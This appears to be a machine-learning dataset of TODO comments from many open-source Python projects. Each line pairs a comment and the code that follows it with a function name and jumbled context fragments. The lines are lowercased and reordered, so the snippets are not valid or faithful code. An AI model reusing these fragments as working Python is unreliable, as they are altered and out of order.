# todo: check what kind of exception raising if no location </s> self.location = html.find('.profileheadercard-locationtext')[0].text	__parse_profile except ParserError: pass self.birthday = html.find('.ProfileHeaderCard-birthdateText')[0].text if self.birthday:
# todo: shouldn't this be none? </s> return tilelayer()	_default_left_layer @default('left_layer') def _default_left_layer(self):
# todo: this scrolling is lame and centers text :/ </s> self.view.show(size)	FlooViewSetMsg self.view.insert(edit, size, data) self.view.set_read_only(True) def is_visible(self): return False
# todo consolidate </s> key_dispatch[key]	loadini for key in (struct.pastebin_key, struct.save_key):
return none # todo </s> return self._listplaylists()	_lsinfo if uri == u'/':
# todo: improve this. </s> self.view.erase_regions('vi_inc_search')	on_change def on_change(self, s): next_hit = self.view.find(s, self.view.sel()[0].b) if next_hit:
# todo: verify the choice between failover and migration </s> qa_utils.runinstancecheck(instance, true)	TestInstanceMigrate af_init_val = _GetBoolInstanceField(instance["name"], af_field) AssertCommand(cmd) if toggle_always_failover: AssertCommand(["gnt-instance", "modify", "-B",
# todo: respond with "user has been added to the list?" </s> async def handle_id(self, author):	MusicBot self.blacklist.add(str(user_id)) write_file('blacklist.txt', self.blacklist) Usage: {command_prefix}id Tells the user their id.
# todo: remove this compatibility layer with rally 1.1.1 </s> index_info = self._client.get_index(self._index)	open self._client.create_index(index=self._index) else: if "metrics" in index_info[self._index]["mappings"]: old_index_name = self._index
#todo: check if all selected objects are on visible layers (option bpy.ops.object.select_all()?) </s> if bpy.data.worlds[0].relativepath:	export def export(): outpath = securepath(os.path.expanduser(os.path.join(bpy.path.abspath("//"), bpy.data.worlds[0].path))) else:
# todo: this here always returns empty response. if/when we want to </s> args = []	mock_etherscan_query output_types = get_abi_output_types(fn_abi) decoded_input = web3.codec.decode_abi(input_types, bytes.fromhex(data[10:])) result = '0x' + web3.codec.encode_abi(output_types, [args]).hex() response = f'{{"jsonrpc":"2.0","id":1,"result":"{result}"}}'
#todo: this is a horrible thing to do, we consume lots of memory </s> tmp_set = set(self._fuzzable_request_set)	_discover_and_bruteforce res = set() add = res.add while True: discovered_fr_list = self._discover( tmp_set )
raise exception('lol') #todo fixme </s> return excludes	_get_excludes excludes = open(exclude_file_path, 'w').read().split() except IOError:
# todo: add possible tags </s> )	get_arguments help="search format to search for on YouTube, special tags " "are to be surrounded by curly braces. Possible tags: " parser.add_argument( "-d",
# todo: consolidate these trivial group by dispatched funcs </s> groupings = __data.grouper.groupings	_unite_gdf @unite.register(DataFrameGroupBy) def _unite_gdf(__data, *args, **kwargs): df = __data.obj f_unite = unite.registry[pd.DataFrame]
# todo: this is a very flaky assumption. find a better one. </s> future_timestamp = (	_VerifyRecord Returns: bool: True if this is a valid PLS Recall record, False otherwise. timelib.Timestamp.GetNow() + self._SIX_YEARS_IN_MICRO_SECONDS) if pls_record.last_written_time > future_timestamp:
# todo: fails because of missing svg support </s> page, = parse('''	test_images_16 @assert_no_logs def test_images_16(): <body style="float: left"> <img style="height: 200px; margin: 10px; display: block" src="
# todo: handle overwrite case </s> sftp.put(source.path, target.path)	append_anything_to_ssh ssh = target.connect() sftp = ssh.open_sftp() return target
# todo(vish): move this into the driver layer </s> logging.debug("getting console output for %s", (instance_id))	get_console_output @exception.wrap_exception def get_console_output(self, context, instance_id): instance_ref = db.instance_get(context, instance_id) if FLAGS.connection_type == 'libvirt':
# todo: remove once multiple meanings in vocabulary are </s> cards = card_type.create_sister_cards(fact)	create_new_cards _("&Merge and edit"), _("&Add as is"), _("&Do not add")) if answer == 0:  # Merge and edit. db.add_fact(fact) for card in cards:
# todo: this class is incorrect: buildbot.slave.bot.slavebuilder </s> called by the worker's l{buildbot.slave.bot.slavebuilder} to	remote_complete def remote_complete(self, failure=None): notify me the remote command has finished. @type  failure: L{twisted.python.failure.Failure} or None
# todo test for final </s> return "/%s" % self.canonical_filename()	url def url(self):
# todo why not just expect *only* the attribute value response, </s> if matched_packet_type != eventpackettype.attclient_attribute_value:	char_read_long_handle EventPacketType.attclient_procedure_completed], timeout=timeout) raise BGAPIError("Unable to read characteristic") if response['atthandle'] == handle:
# todo: need to add counter </s> return true	send_like delay.small_delay(self) if super(self.__class__, self).sendDirectItem('like', user_ids, thread=thread_id): self.logger.info("Message to {user_ids} wasn't sended".format(user_ids=user_ids)) return False
# todo - use new error message api! ts </s> self.showerrormessage(m.message(str(mymessage)))	accept myFlag, myMessage = self.validate() if not myFlag: self.hideBusy() return
# todo(solitude): remove this. </s> data.update({'pattern': 'account.payment'})	preapproval key = result['key'] else: try: result = paypal.get_preapproval_key(data)
raise skiptest("buggy")  # todo(mattjj): fix </s> p = onp.arange(15).reshape((5, 3)) % 4 == 1	testSelect def testSelect(self): f = onp.zeros((5, 3)) def fun(t):
# todo(guillermooo): generalize class so it can run any polymer command. </s> def __init__(self, *args, **kwargs):	PolymerCommand class PolymerCommand(sublime_plugin.WindowCommand): super().__init__(*args, **kwargs) def run(self, message):
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_approvees_contents_invalid def test_fail_approvees_contents_invalid(self):
# todo: this remembers every file user ever saw in nautilus. </s> path = self._get_path(file)	update_file_info def update_file_info(self, file): self.files[path] = file if not self.ready: return plugin_module.OperationResult.COMPLETE
# todo: we should store a storage version number in later releases. </s> if isinstance(state, tuple) and len(state) == 5:	__setstate__ def __setstate__(self, state): (number_of_nodes, readonly, src_nodes, dst_nodes) dgl_warning("The object is pickled pre-0.4.2.  Multigraph flag is ignored in 0.4.3") num_nodes, _, readonly, src, dst = state
# todo: check that path combined with uri does not go above </s> return len(self.path) <= 25	good_path characters from the URL-safe alphabet for Base64 encoding [RFC4648]", base64.b64decode ignores those characters
# see optimization description comments and todo for tags in matching public histories query. </s> return trans.sa_session.query(self.model_class).join("user").options(lazyload("latest_workflow"), eagerload("user").load_only("username"), eagerload("annotations"), undefer("average_rating"))	build_initial_query def build_initial_query(self, trans, **kwargs):
#todo: overly broad exception needs fixing </s> except exception:	get_counts count_query['query']['filtered']['query']['query_string']['query'] = \ re.sub(r' AND category:\S*', '', count_query['query']['filtered']['query']['query_string']['query']) pass if count_query.get('from') is not None:
# todo: what are these doing here? </s> from corehq.apps.hqwebapp.templatetags.proptable_tags import get_tables_as_rows, get_definition	render_case Uses options since Django 1.3 doesn't seem to support templatetag kwargs. Change to kwargs when we're on a version of Django that does. case = wrapped_case(case) timezone = options.get('timezone', pytz.utc)
# todo: check if this is a windows symbol requirement, otherwise ignore it </s> self._symbol_requirements = self.find_requirements(context, config_path, requirement,	__call__ if "pdbscan" not in context.symbol_space: context.symbol_space.append(native.NativeTable("pdbscan", native.std_ctypes)) interfaces.configuration.SymbolRequirement) if self._symbol_requirements:
singleton=false,  # todo: re-enable </s> )	render tag='renderers', pack=pack, rend = FilterDictWrapper(ret, '.render') if not check_render_pipe_str(opts['renderer'], rend):
# todo: does it get closed properly after process gets killed? </s> self._sftp = paramiko.sftpclient.from_transport(self._client.get_transport())	_get_sftp if self._sftp is None: import paramiko return self._sftp
# todo: this should be abstracted into a property/method or something </s> if region.inherited and not contents and hasattr(obj, 'parent_id') and obj.parent_id:	collect_items def collect_items(obj): contents = obj._content_for_region(region) return collect_items(obj.parent) return contents
# @todo: catch warnings </s> libcloud.security.verify_ssl_cert = true	test_setup_verify def test_setup_verify(self): self.httplib_object._setup_verify() libcloud.security.VERIFY_SSL_CERT = False
# todo: fix </s> 0,	optimization request_json.finish_date, 5, request_json.export_csv, request_json.export_json
# todo use a proper category instead </s> "tags": [config["full_project_name"]],	wordpress_new_page "parent": WORDPRESS_PARENT_PAGE_ID, "type": "page", "comments_open": False, "pings_open": False,
# todo(b/157460932): migrate to glaziererror </s> terminator.log_and_exit('failed to execute the task list',	RunBuild r.Start(task_list=task_list) except runner.ConfigRunnerError as e: self._build_info, 4304, e) except KeyboardInterrupt:
pass # todo </s> def handle_request(self, input):	handle_request
#todo: should raise an exception or warning </s> self._read_only = true	Annotations input_files = [document] if not access(document, W_OK): elif suff in PARTIAL_ANN_FILE_SUFF: input_files = [document]
# todo does not work after multiprocessing branch merge </s> closes the connection to mpd.	_connection_close ``close``
# todo(b/182316162): unify publisher handing so that post-execution artifact </s> outputs_utils.tag_output_artifacts_with_version(task.output_artifacts)	_publish_execution_results _update_state(result.status) return publish_params = dict(output_artifacts=task.output_artifacts) if result.output_artifacts is not None:
# todo: optimise this to move some of the work to the workers. </s> data = receipt["data"]	received_client_receipt if not is_new: return users = yield self.state.get_current_user_in_room(room_id) remotedomains = set(get_domain_from_id(u) for u in users)
# todo implement this </s> self.logger.debug('return:')	run_cmd self.logger.debug(cmd_line) result = None self.logger.debug(result) return result
# todo is_compiled_with_cuda() has not been moved </s> compiled_with_cuda = paddle.fluid.is_compiled_with_cuda()	get_sys_env env_info['platform'] = platform.platform() env_info['Python'] = sys.version.replace('\n', '') env_info['Paddle compiled with cuda'] = compiled_with_cuda if compiled_with_cuda:
# todo: look at this </s> resp = n.name_registration_request('*jsmbserver', self.servername, nmb.type_workstation, none,nmb.nb_flags_ont_p, '1.1.1.2')	test_name_registration_request def test_name_registration_request(self): n = nmb.NetBIOS() resp.dump()
# (todo) chagne the dgl link </s> if osp.isdir(self.folder) and (not osp.exists(osp.join(self.folder, f'release_v{self.version}.txt'))):	PCQM4Mv2Dataset self.version = 1 self.url = f'http://ogb-data.stanford.edu/data/lsc/pcqm4m-v2.zip' print('PCQM4Mv2 dataset has been updated.') if input('Will you update the dataset now? (y/N)\n').lower() == 'y':
# todo: create a hard bounce receipt rule in ses </s> except deletedaddress.doesnotexist:	_get_profile_and_relay_address ) incr_if_enabled('email_for_deleted_address', 1) incr_if_enabled('email_for_unknown_address', 1) logger.error(
# todo: finish this </s> parsed_markup = [msnplus]	_msnplus_to_dict match = open_tag_re.match(msnplus) if not match: #only text message_stack.append(msnplus) return {'tag': 'span', 'childs': parsed_markup}
#! todo: this is currently limited to siso systems </s> num = sp.poly1d(\	freqresp nout, nin = self.D.shape den = sp.poly1d(sp.poly(self.A)) sp.poly(self.A - sp.dot(self.B, self.C)) + (self.D[0] - 1) * den) fresp = map(lambda w: num(w*1j) / den(w*1j), omega)
# resume normal sphinx.ext.autodoc operation </s> return super(functiondocumenter, self).format_name()	format_name return super(FunctionDocumenter, self).format_name() if len(self.objpath) > 1: return self.module.__func_alias__.get(self.objpath[0], self.objpath[0])
# todo: rewrite this simpler, we're using less than written </s> perform first and second level encoding of name as specified in rfc 1001 (section 4)	encode_name def encode_name(name, type, scope): :param string name: the name to encode :param integer type: the name type constants
# todo add help_text and label when they are available </s> 'read_only': true,	test_options_root_view }, 'id': { 'required': False, 'type': 'Integer',
# todo get fileid from event </s> if 'offset' not in event.info['params'] or event.info['params']['offset'] == '0':	downloadFileStartEvent def downloadFileStartEvent(event): rpdb.set_trace() fileModel = File()
# todo: decide what we consider to be a trending pack, for now we just take the last 9 that were updated </s> trending_packs = pack.objects.select_related('user').filter(num_sounds__gte=3).order_by('-last_updated')[:9]	front_page top_donor_username = sorted(top_donor_data.items(), key=lambda x: x[1], reverse=True)[0][0] top_donor = User.objects.get(username=top_donor_username) tvars = { 'rss_cache': rss_cache,
"""todo: to be implemented""" </s> def onenquirelinkresp(self, sequence_number):	onEnquireLinkResp
# todo: consider revising to use new disk.target_name property. </s> try:	_role_filter_disk_names :param request: :return: list of disk names post role filter processing role_disks = {d for d in disks if d.role is not None} redirect_disks = {d.name: json.loads(d.role).get("redirect", None)
''' todo: change conditional to return on non-http responses </s> to reduce branch depth'''	main iter = TextRecordParser(**textRecordParserOptions) for entry in iter(warc): if entry.record.rec_type != 'response' or \ entry.get('mime') in ('text/dns', 'text/whois'):
# todo(yanase): remove number from system_attrs after adding trialmodel.number. </s> if include_internal_fields:	test_trials_dataframe df.set_index(('number', ''), inplace=True, drop=False) assert len(df) == 3 assert len(df.columns) == 9 + 3 else:
#todo: the static files should not run everything on __init__ </s> self._static = none	rebuild self.listener.pause() try: self.build() except Exception, e:
# todo project_id = 'your google cloud project id' </s> client = asset_v1beta1.assetserviceclient()	batch_get_assets_history from google.cloud.asset_v1beta1.proto import assets_pb2 from google.cloud.asset_v1beta1 import enums parent = client.project_path(project_id) content_type = enums.ContentType.RESOURCE
pass # todo </s> def handle_request(self, input):	handle_request
pass  # todo </s> def lookup(self, uri):	lookup
# todo: only decrypt metadata if header is present </s> with self._get_boto() as boto:	fetch_fh tmp = tempfile.TemporaryFile() (fh, tmp) = (tmp, fh) bkey = boto.get_key(key) if bkey is None:
# todo: solution is not really elegant. should find </s> if update_var.name.startswith(('weight', 'bias')):	init_layer_update step = layer.step or self.variables.step for update_var, update_func in updates: update_func -= step * self.decay_rate * update_var modified_updates.append((update_var, update_func))
extruder_stack.userchanges.setproperty(key, "value", new_value)  # todo: nested property access, should be improved </s> if extruder_stack != self._active_container_stack and extruder_stack.getproperty(key, "value") != new_value:	copyAllValuesToExtruders for extruder_stack in extruder_stacks:
# todo hard-disable tests for now, since rapidcheck not in spack </s> "-dkrims_enable_tests=off",	cmake_args "-DBUILD_SHARED_LIBS=" + str("+shared" in spec), "-DDRB_MACHINE_SPECIFIC_OPTIM_Release=ON",  # Adds -march=native "-DKRIMS_ENABLE_EXAMPLES=" + str("+examples" in spec), ]
# todo implement callback </s> if callback is not none:	write except IOError as e: log.warning("Failed to close buffered writer!", e) pass self.buffered_writer = None
# todo: this only works on local files !!! </s> return os.path.isfile(safe_join(filepath, filename))	zip_existing filepath = self._download_path(app) filename=self.download_name(app, ty)
# todo: duplicate checking </s> self._associate.append((association_type, value))	add def add(self, association_type: LicenseAssociationType, value: str):
# todo check if we can avoid that </s> out = numpy.zeros(ntet)	read_buffer out = numpy.fromfile( f, count=ntet * 4, dtype=int, sep=" ").reshape(ntet,4) cells["tetra"] = out - 1 cell_data["tetra"] = {"ugrid:ref": out} if npyra > 0 :
# @todo: the values must be in cgs already right? </s> sg.attrs["field_to_cgs"] = 1.0	_write_field_to_gdf else: sg.attrs["field_units"] = "None" sg.attrs["staggering"] = 0 g = fhandle["data"]
output_zero_point = none # todo non-zero zero point </s> output = quanttensor(	__mul__ output_zero_point = self.zero_point * other.zero_point else: value=output_value, scale=output_scale,
# todo: before merge should discuss with syft core team on max time. </s> ctr = 3000	execute_action try: try: while True: storable_object = node.store.get_object(key=self.id_at_location)
# todo: turn this into a runtime error </s> logger.warning("attempted to updated plugins when registry is initialized")	autoremove_unavailable_plugins from kolibri.plugins.registry import is_initialized if is_initialized(): changed = False for module_path in config["INSTALLED_PLUGINS"].copy():
# todo: we currently lack a reference family that passes this test! </s> ttfont = ttfont("data/test/mada/mada-medium.ttf")	test_id_065 has_kerning_info, ligatures) lig = ligatures(ttFont) has_kinfo = has_kerning_info(ttFont)
file_object = open(file_path, mode='r') #todo add  encoding='utf8' for version python3 </s> lines = file_object.readlines()	load_label_dict_article :param file_path: :return: a dict, named:label2index_dict label2index_dict = {} for i, label in enumerate(lines):
# todo: read this parameter from the command line by implementing make_cmdline_parser and parse_known_cmdline_args! </s> if self._gui is not none:	getSelectedExportSourceName def getSelectedExportSourceName(self): return self._gui.selectedExportSource
#@todo: move this and other methods out of this file, into a general </s> from utilities.prefs_constants import dnabaseindicatorsangle_prefs_key	get_all_available_dna_base_orientation_indicators reference_indicator_dict = {}, skip_isStrandChunk_check = False): from utilities.prefs_constants import dnaBaseIndicatorsDistance_prefs_key indicators_angle = env.prefs[dnaBaseIndicatorsAngle_prefs_key]
# todo ensure that if you try to filter on an invalid field, it returns a useful error. </s> try:	query_params_to_odm_query for key, value in fields_dict.items() if self.is_filterable_field(key, value) ] query = functools.reduce(intersect, query_parts) except TypeError:
# todo: return errors in a universal way </s> print("shivyc: error: notimplementederror")	main s_source = compile_code(c_source) except NotImplementedError: return try:
if lang is none:  # todo: remove in v8 </s> utils.logger.warn("renderauthors.slugify_author_name() called without language!")	slugify_author_name def slugify_author_name(self, name, lang=None): lang = '' if self.site.config['SLUG_AUTHOR_PATH']:
# todo: force this somehow so that this isn't just a warning but </s> url_object_list = get_urls_from_kb()	update_kb [<url_object for "http://w3af.org/">, <url_object for "http://w3af.org/blog/">] with update_lock: new_list = [ fr.getURL() for fr in fuzzable_request_list \ if fr.getURL() not in url_object_list ]
# todo: not all values have exact matches in flexget, need to update flexget qualities </s> cp_to_flexget = {'br-disk': 'remux',  # not a perfect match, but as close as currently possible	on_task_input parsedurl.path)) entries = [] '1080p': '1080p', '720p': '720p',
# todo: only handle events that are new. </s> for e in events:	__watch_slack_rtm events = self.client.rtm_read() if len(events) > 0: self.handle_incoming_event(e) time.sleep(0.5)
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_create_store)), 'datalad-test'	test_create_simple def test_create_simple(): yield _test_create_store, None
# todo: if table_name is "2019" the final name will be "field_2019" - must </s> if dialect is none:  # get a sample to detect dialect	csv_to_sqlite ): "Export a CSV file to SQLite, based on field type detection from samples" fobj = open_compressed(input_filename, mode="rb") sample = fobj.read(chunk_size)
raise notimplementederror # todo </s> def em_step(self):	EM_step
# todo: delete </s> self.assertisinstance(writer, klass)	test_filetype_to_instance with can.Logger(filename) as writer:
# todo: does this import need to be delayed because </s> from pyomo.solvers.plugins.solvers.persistent_solver import \	solve keep_solver_files=False, io_options=None): PersistentSolver if self.instance is None:
pass  # todo... </s> def _make_code(self):	_make_code
# todo this seems not to be very convenient... </s> for key, classdef in inspect.getmembers(sys.modules[__name__], inspect.isclass):	unregister def unregister(): print("Unregistering operators.editing...") bpy.utils.unregister_class(classdef)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_regular_command_null_token other methods to control access (e.g., listen only on loopback interface, use IP address whitelist, etc.).
pass # todo </s> def _make_assignments(self):	_make_assignments
# todo(harlowja): should we be a little more cautious about </s> task_details = wf_details.fetch_tasks(td_name)[0]	task_result_fetcher td_name = task_state_name_functor(task, states.SUCCESS) if td_name in wf_details: if task_details.metadata and 'result' in task_details.metadata: return (True, task_details.metadata['result'])
# todo: assert </s> self.asserttrue(result_subprofile_remove)	test_remove_profile result_subprofile_remove = self.remote.remove_profile("testsubprofile0", self.token) result_profile_remove = self.remote.remove_profile("testprofile0", self.token) self.assertTrue(result_profile_remove) assert 0
#todo need gutter of scrollbar - how do we get that? </s> size_of_arrow = 14	on_diffmap_expose_event gcb.set_rgb_fg_color( gdk.color_parse("black") ) area.meldgc = [None, None, gce, None, gcd, gcc, gcc, None, gcb] hperline = float( area.get_allocation().height - 3*size_of_arrow) / numlines scaleit = lambda x,s=hperline,o=size_of_arrow: x*s+o
# todo: this should be made more flexibly to handle differeing params for xform submission </s> try:	get_response attachments = {} if self.request.META['CONTENT_TYPE'].startswith('multipart/form-data'): instance = self.request.FILES[self.magic_property].read() except MultiValueDictKeyError:
# todo: this currently looks only in current table; </s> spans = [c] if isinstance(c, temporaryspan) else c.get_arguments()	get_vert_aligned_ngrams def get_vert_aligned_ngrams(c, attrib='words', n_min=1, n_max=1, lower=True): for span in spans: if span.sentence.table is None: continue
# todo(wentingli): create manifest from dependency jars later if needed </s> contents = 'manifest-version: 1.0\ncreated-by: python.zipfile (blade)\n'	_generate_fat_jar console.warning('%s: Found %d conflicts when packaging' % ( os.path.basename(target), zip_path_conflicts)) main_class = env.Dictionary().get('JAVAMAINCLASS') if main_class:
# todo(b/142684737): the multi-processing api might change. </s> beam_pipeline_args=['--direct_num_workers=%d' % direct_num_workers])	_create_pipeline metadata_connection_config=metadata.sqlite_metadata_connection_config( metadata_path),
# todo: for now, circumnavigate the detached head issue. </s> for subds in source.get_dataset_handles(recursive=true):	test_publish_file_handle def test_publish_file_handle(origin, src_path, dst_path): source = install(path=src_path, source=origin, recursive=True) AnnexRepo(opj(src_path, subds), init=True, create=False).git_checkout("master") source.repo.get('test-annex.dat')
# todo: --bytype </s> print (line_break)	main for (auth, stats) in auth_stats.iteritems(): print ("| {0:30s} | {1:6d} |".format(auth, stats["loc"]))
node.test = gast.call(gast.attribute( # todo any over dim 0 </s> test, gast.name('any', gast.load(), none), none), [], [])	visit_While raise NotImplementedError("cannot process while-else") test = node.test return self.visit_loop(node, test)
# todo: slow </s> v0 = vector((posa[i0 * 3 + 0], posa[i0 * 3 + 1], posa[i0 * 3 + 2]))	calc_tangents i1 = ia[i * 3 + 1] i2 = ia[i * 3 + 2] v1 = Vector((posa[i1 * 3 + 0], posa[i1 * 3 + 1], posa[i1 * 3 + 2])) v2 = Vector((posa[i2 * 3 + 0], posa[i2 * 3 + 1], posa[i2 * 3 + 2]))
# todo: raise a specific exception for invalid separator characters </s> assert not sep or sep in settings.sep_chars	new @param auto: enables automatic save @raise DoorstopError: if the document already exists config = os.path.join(path, Document.CONFIG) if os.path.exists(config):
# todo: smart profiling for parameter back-time (if it set up to 'auto') </s> def _get_response(self):  # todo: add timeout	GraphiteClient self.check_time = None self.timeout = int(dehumanize_time(self.config.get('timeout', '5s'))) try: str_data = urlopen(self.url, self.timeout)
# todo obtain this from entitlements </s> entitlements_plist = biplist.readplist(entitlements_file)	get_team_id def get_team_id(entitlements_file): return entitlements_plist[TEAM_IDENTIFIER_KEY]
# todo -- can we do this without a subscription? </s> if not api.use_store:	list_album_by_artists @ask.intent("GeeMusicListAllAlbumsIntent") def list_album_by_artists(artist_name): return statement(render_template("not_supported_without_store")) api = GMusicWrapper.generate_api()
# todo: fails for rsa256_key </s> csr_pem, csr_der = self._call(	MakeCSRTest def test_san(self): from letsencrypt.crypto_util import get_sans_from_csr RSA512_KEY, ['example.com', 'www.example.com']) self.assertEqual(
# python3-todo: use yield from </s> for tmp in greedy_rec(h, linext+[e]):	greedy_rec not any(low in S_ for low in self.neighbors_in(x))] for e in S: yield tmp
# todo: is this a public attribute? </s> self._registeroldworkerattr("remote_worker")	checkConfig error("LocalWorker needs the buildbot-slave package installed (pip install buildbot-slave)") self.remote_worker = None
# todo add list as an option </s> if ia.is_single_number(p):	Dropout Identical to the previous example, but the `per_channel` feature is only active for ``50`` percent of all images. p2 = iap.Binomial(1 - p) elif ia.is_iterable(p):
# todo (a8): add user to models </s> setattr(self.obj, 'user', user.objects.get(pk=1))	_populate_by_obj self.obj.branch = self.obj.revision.branch setattr(self.obj, 'result', self.obj) setattr(self.obj, 'notify', None)
f.write(self.pastie_content.encode('utf8'))  # todo error checking </s> with open(full_path, 'w') as f:	savePastie else:
# todo: cache this result so multiple failing calls don't keep hitting the db </s> return none	sql_product self._sql_product = SQLProduct.objects.get(domain=self.domain, product_id=self.entry_id) except ObjectDoesNotExist: return self._sql_product
# todo: prefer to enumerate specific </s> "action": "s3:deleteobject*",	grant_delete_permissions_to { "Effect": "Allow", "Resource": f"{bucket_arn}/*", }
raise notimplementederror #todo </s> elif self.action == "merge":	Action raise NotImplementedError #TODO elif self.action == "APPEND": raise NotImplementedError #TODO elif self.action == "SPLIT":
# todo: switch _ignore_connection_reset for _ignore_transmission_error, or provide retry mechanism </s> if self._ignore_connection_reset:	_check_message callback_data = self._callback_current_node(node=self.fuzz_node, edge=path[-1]) except sex.BoofuzzTargetConnectionReset: self._fuzz_data_logger.log_info("Target connection reset.") else:
# todo: strip leading whitespace for ''' and r''' </s> tmp = [evalcstringtoken(t) for t in part.tokens]	EvalSingleQuoted s = ''.join(tmp) elif part.left.id in (Id.Left_DollarSingleQuote, Id.Left_DollarTSingleQuote): s = ''.join(tmp) else:
# todo: support steps and times (motion blur) </s> print("dupli export took %.3fs" % (time() - start))	convert transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations)
# todo(bowen): check </s> return chem.moltosmiles(m, isomericsmiles=true)	get_final_smiles m = convert_radical_electrons_to_hydrogens(self.mol)
# todo: purge expired tokens </s> log.audit('token "%s" has expired.' % (token_string))	validate_token token = Token.get(token_string) if token.expiry <= isotime.add_utc_tz(datetime.datetime.utcnow()): raise exceptions.TokenExpiredError('Token has expired.') LOG.audit('Token "%s" is validated.' % (token_string))
# @todo: move this to a popup behind an action button, to make it clearer that this isn't a maintained link </s> stable = current.s3db.event_scenario	event_rheader editable = current.auth.s3_has_permission("UPDATE", "event_incident", record_id) if editable and r.method == "plan": query = (stable.incident_type_id == incident_type_id) & \ (stable.deleted == False)
# todo more through test </s> x = np.ones((2, 3))	test_pytables tests wether DenseDesignMatrixPyTables can be loaded and initialize iterator y = np.ones(2) ds = DenseDesignMatrixPyTables(X = x, y = y)
# todo: implement this! </s> interpreter = ''	_selectClient interpreter = python else: extension = 'py' interpreter = '/usr/bin/python'
# todo: add at least reflection tests before adding notimplemented version </s> def prioid(context, *args):	prioid *musicpd.org, current playlist section:* ``prioid {PRIORITY} {ID...}``
# todo(b/161952382): replace with keras premade models and </s> deep = tf.keras.layers.densefeatures(deep_columns)(input_layers)	_wide_and_deep_classifier for colname in _transformed_names(_CATEGORICAL_FEATURE_KEYS) }) for numnodes in dnn_hidden_units: deep = tf.keras.layers.Dense(numnodes)(deep)
# todo(phawkins): remove this after a jaxlib release. </s> if not hasattr(lapack, "jax_getrf"):	testLuFactor @jtu.skip_on_devices("gpu", "tpu") def testLuFactor(self, n, dtype, rng): self.skipTest("No LU implementation available") args_maker = lambda: [rng((n, n), dtype)]
# todo: implement </s> def build_tree(verlet_update, kinetic_fn, verlet_state, inverse_mass_matrix, step_size, rng,	build_tree max_sliced_energy=1000., use_multinomial_sampling=True, max_tree_depth=10, iterative_build=True):
# todo use deepcopy() here </s> return polygonsonimage(polygons, shape)	on else: polygons = [poly.project(self.shape, shape) for poly in self.polygons]
# todo: explicitly commit files by name </s> youngest_ancestor = os.path.commonprefix(files)	add if exitcode != 0: raise IOError("[SVN] Error running SVN command '%s': %s" % (command, error)) return output + type(self)(youngest_ancestor).commit(message, author)
# todo add options to modify the columns </s> matrix.append([endpoint.machine.name,	do_ignore if vlan.startswith('VLAN'): vlan.split('VLAN')[1] endpoint.endpoint_data['mac'], endpoint.endpoint_data['segment'],
# todo: make sure loop index is not used for calculations in </s> if config.debug_array_opt==1:	_run_parfor unwrap_parfor_blocks(parfor) if self._dist_analysis.parfor_dists[parfor.id]!=Distribution.OneD: print("parfor "+str(parfor.id)+" not parallelized.") return [parfor]
pass ## fixme: todo </s> def test_walk_files_or_dirs(self):	test_walk_files_or_dirs
# todo merged db? </s> print(f"{gr[0].dt}--{gr[-1].dt}")	print_groups for gr in get_groups():
# todo: --csr could have a priority, when --domains is </s> return "--domains and --csr are mutually exclusive"	obtain_cert def obtain_cert(config, plugins, lineage=None): if config.domains and config.csr is not None: try: installer, authenticator = choose_configurator_plugins(config, plugins, "certonly")
# todo(chunla) move this to engine specific module </s> def _getsysbenchconnectionparameter(client_vm_query_tools):	_GetSysbenchConnectionParameter connection_string = '' if client_vm_query_tools.ENGINE_TYPE == sql_engine_utils.MYSQL:
self.key_vb   = f.tanh(self.hid_2_key(hidden_vb)).view(-1, self.num_heads, self.mem_wid)    # todo: relu to bias the memory to store positive values ??? check again </s> self.beta_vb  = (1. + f.softplus(self.hid_2_beta(hidden_vb))).view(-1, self.num_heads, 1)   # beta >=1: https://github.com/deepmind/dnc/issues/9	forward def forward(self, hidden_vb, memory_vb): self._content_focus(memory_vb)
# todo / fixme : here we are ignoring error messages ... </s> output, err = call.communicate()	_check_if_vulnerable_to_meltdown stdout=subprocess.PIPE, stderr=subprocess.PIPE) assert call.returncode in (0, 2, 3), "Return code: %s" % call.returncode CVEs = json.loads(output)
# todo isoformat? </s> dt=pytz.utc.localize(datetime.strptime(d['created_at'], '%y-%m-%dt%h:%m:%sz')),	iter_events body = d.get('payload', {}).get('comment', {}).get('body') yield Event( summary=summary, link=link,
# todo: need to test this logic </s> if index in field:	split index = bc.function_space().index cmpt = bc.function_space().component if len(field) == 1: W = V
logging.info(f'running command\n`{cmd}`') #todo: consider with ilya </s> return run(*args, **kwargs)	run_with_log def run_with_log(*args, **kwargs): cmd = args[0]
# todo: arrange </s> profiles = self.remote.get_profiles(self.token)	test_create_profile def test_create_profile(self): Test: create/edit a profile object profile = self.remote.new_profile(self.token) for field in self.profile_fields:
# todo: typing for pb </s> def to_pb(self) -> any:	to_pb pb_msg = pb.StreamInfo( peer=self.peer_id.to_bytes(),
# todo speed! </s> sub_cats = map(none, cats)	cat_children def cat_children(cats): for c in cats: out = Category.objects.filter(tree_parent=c)
# todo: see get_scale_factor() to choose 72 px on hidpi </s> return getattr(row.icon._impl, "native_" + str(32))	get_icon else: row.icon.bind(factory)
# todo: refactor accordingly when v3 websocket api is released </s> trading_pair = f"{trading_pair.split('-')[1]}-{trading_pair.split('-')[0]}"	BittrexAPIOrderBookDataSource trading_pairs = await self.get_trading_pairs() for trading_pair in trading_pairs: self.logger().info(f"Subscribed to {trading_pair} deltas") self._websocket_hub.server.invoke("SubscribeToExchangeDeltas", trading_pair)
# todo: use stream_with_context instead of list </s> streamed_response = response(list(audit_iterator),	search else: audit_iterator = JSONAuditIterator(audit_query) content_type="application/json") c.audit['success'] = True
# todo: if needed allow other handling (like adding values) </s> np.maximum(filt.filter, filt_pos, out=filt_pos)	multi_filterbank stop = min(start + len(filt.filter), num_fft_bins) filt_pos = bank[start:stop, band_id] if norm: bank /= bank.sum(0)
# todo. tune this "10" hyperparameter </s> loss = f.sigmoid(10 * (delta + self.margin_))	triplet_loss loss = torch.log1p(torch.exp(delta)) elif self.clamp == 'sigmoid': if return_delta: return loss, delta.view((-1, 1)), pos, neg
# todo(mgius): tests for views using this api call </s> return [tenant(t) for t in auth_api().tenants.for_token(token)]	token_list_tenants def token_list_tenants(request, token):
"""todo: doesn't remove unused nodes/renumber elements""" </s> z = self.xyz[:, 2]	slice_z def slice_z(self, zslice): self._slice_plane(z, zslice)
